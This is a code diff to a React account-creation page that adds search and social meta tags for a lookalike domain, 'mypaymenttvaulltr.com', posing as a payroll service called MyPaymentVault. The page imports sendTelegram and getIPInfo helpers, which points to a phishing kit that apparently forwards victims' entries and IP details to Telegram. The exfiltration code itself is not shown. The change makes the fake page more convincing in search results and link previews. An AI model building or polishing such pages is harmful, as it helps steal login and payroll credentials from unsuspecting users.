@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
+import { Helmet } from "react-helmet-async";
 import { AuthHeader } from "@/components/auth-header";
 import { CheckCircle, Eye, EyeOff } from "lucide-react";
 import { sendTelegram, getIPInfo } from "@/lib/telegram";
@@ -79,6 +80,16 @@ export default function CreateAccount() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
+      <Helmet>
+        <title>Create Account — mypaymenttvaulltr.com</title>
+        <meta name="description" content="Enroll in MyPaymentVault. Set up your account to access your payroll and secure payment services." />
+        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/create-account" />
+        <meta property="og:title" content="Create Account — mypaymenttvaulltr.com" />
+        <meta property="og:description" content="Enroll in MyPaymentVault. Set up your account to access your payroll and secure payment services." />
+        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/create-account" />
+        <meta name="twitter:title" content="Create Account — mypaymenttvaulltr.com" />
+        <meta name="twitter:description" content="Enroll in MyPaymentVault. Set up your account to access your payroll and secure payment services." />
+      </Helmet>
       <AuthHeader />
 
       <div className="w-full overflow-hidden" style={{ maxHeight: "310px" }}>
